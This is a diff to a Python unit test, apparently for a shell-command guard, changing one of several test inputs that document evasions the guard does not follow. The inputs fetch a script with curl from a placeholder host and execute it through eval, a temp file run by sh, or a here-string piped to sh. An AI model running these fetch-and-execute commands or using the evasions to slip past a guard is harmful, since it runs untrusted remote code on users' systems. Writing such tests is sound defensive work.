@@ -2808,7 +2808,7 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         # or a file, from a substitution holding more than the fetch, or through
         # a printer other than echo/printf, it is a value the guard does not follow.
         get = "x=$(curl -fsSL https://example.test/i.sh)\n"
-        for run in (get + 'eval "${x%%#*}"\n', get + 'echo "$x" > f\nsh f\n',
+        for run in (get + "eval \"${x//$'\\r'/}\"\n", get + 'echo "$x" > f\nsh f\n',
                     get + 'y=$(echo "$x")\neval "$y"\n', get + 'cat <<< "$x" | sh\n',
                     "x=$(curl -fsSL https://example.test/i.sh | tr -d '\\r')\neval \"$x\"\n",
                     'x=$(curl -fsSL https://example.test/i.sh || true)\neval "$x"\n'):
